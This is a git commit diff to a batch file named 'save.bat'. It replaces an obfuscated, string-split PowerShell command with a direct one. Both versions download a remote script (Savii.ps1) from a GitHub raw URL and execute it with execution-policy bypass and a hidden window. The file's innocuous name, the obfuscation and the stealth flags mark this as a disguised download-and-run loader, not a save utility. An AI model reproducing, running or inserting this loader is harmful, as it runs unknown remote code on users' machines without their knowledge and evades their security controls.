5a846e8525dbc2384ba603029faf23b3c452853f
Brandon c2e <brand.opn0@gmail.com>
2026-08-06 22:10:01 +0600

    Update save.bat

--- save.bat
+++ save.bat
@@ -1,8 +1,2 @@
 @echo off
-set "e1=Invoke"
-set "e2=-Expression"
-set "e3= ("
-set "e4=Invoke-RestMethod"
-set "e5= https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
-set "cmd=%e1%%e2%%e3%%e4%%e5%"
-powershell -NoP -NoL -ep Bypass -Win 1 -Command "%cmd%"
+powershell -NoP -NoL -ep Bypass -Win 1 -Command "try { iex (irm https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1) } catch { exit 1 }"
